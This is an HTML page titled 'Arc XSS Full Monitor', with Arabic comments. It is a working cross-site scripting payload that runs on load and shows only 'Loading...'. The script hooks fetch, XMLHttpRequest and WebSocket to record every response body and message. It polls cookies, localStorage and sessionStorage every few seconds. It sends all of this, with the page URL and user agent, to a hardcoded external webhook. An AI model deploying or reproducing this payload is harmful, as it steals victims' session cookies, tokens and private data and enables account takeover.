<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8" /><title>Arc XSS Full Monitor</title></head>
<body>
<script>
  const WEBHOOK_URL = "https://eoeisd0pus6doy3.m.pipedream.net/";

  function sendToWebhook(data) {
    // فلترة عشان ما نبعتش طلبات للويب هوك تسبب loop
    if (data.url && data.url.startsWith(WEBHOOK_URL)) return;
    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }).catch(err => console.error("Failed sending data:", err));
  }

  // مراقبة fetch
  (function(){
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
      return originalFetch.apply(this, args).then(async response => {
        const cloned = response.clone();
        let responseBody = null;
        try {
          responseBody = await cloned.json();
        } catch {
          try {
            responseBody = await cloned.text();
          } catch {}
        }
        sendToWebhook({
          type: "fetch-response",
          url: response.url,
          status: response.status,
          statusText: response.statusText,
          body: responseBody,
          timestamp: new Date().toISOString()
        });
        return response;
      });
    };
  })();

  // مراقبة XMLHttpRequest
  (function(){
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
      this._method = method;
      this._url = url;
      return originalOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
      this.addEventListener("load", () => {
        let responseBody = null;
        try {
          responseBody = JSON.parse(this.responseText);
        } catch {
          responseBody = this.responseText;
        }
        sendToWebhook({
          type: "xhr-response",
          method: this._method,
          url: this._url,
          status: this.status,
          statusText: this.statusText,
          body: responseBody,
          timestamp: new Date().toISOString()
        });
      });
      return originalSend.apply(this, arguments);
    };
  })();

  // مراقبة WebSocket
  (function() {
    const OriginalWebSocket = window.WebSocket;
    window.WebSocket = function(url, protocols) {
      const ws = protocols ? new OriginalWebSocket(url, protocols) : new OriginalWebSocket(url);

      ws.addEventListener('message', event => {
        sendToWebhook({
          type: 'websocket-message',
          url: url,
          data: event.data,
          timestamp: new Date().toISOString()
        });
      });

      return ws;
    }
  })();

  // مراقبة تغير localStorage و sessionStorage كل 5 ثواني
  let lastLocalStorage = null;
  let lastSessionStorage = null;
  setInterval(() => {
    try {
      const currentLS = JSON.stringify(localStorage);
      const currentSS = JSON.stringify(sessionStorage);
      if (currentLS !== lastLocalStorage) {
        lastLocalStorage = currentLS;
        sendToWebhook({type: "localStorage-changed", localStorage: currentLS, timestamp: new Date().toISOString()});
      }
      if (currentSS !== lastSessionStorage) {
        lastSessionStorage = currentSS;
        sendToWebhook({type: "sessionStorage-changed", sessionStorage: currentSS, timestamp: new Date().toISOString()});
      }
    } catch {}
  }, 5000);

  // مراقبة تغير الكوكيز كل 3 ثواني
  let lastCookies = document.cookie;
  setInterval(() => {
    if (document.cookie !== lastCookies) {
      lastCookies = document.cookie;
      sendToWebhook({type: "cookie-changed", cookies: lastCookies, timestamp: new Date().toISOString()});
    }
  }, 3000);

  // إرسال بيانات أولية عند تحميل الصفحة
  sendToWebhook({
    type: "initial-info",
    url: window.location.href,
    cookies: document.cookie || "No cookies",
    localStorage: (() => {
      try { return Object.assign({}, localStorage); }
      catch { return "Access denied"; }
    })(),
    sessionStorage: (() => {
      try { return Object.assign({}, sessionStorage); }
      catch { return "Access denied"; }
    })(),
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  });
</script>
<p style="font-family: sans-serif;">Loading...</p>
</body>
</html>
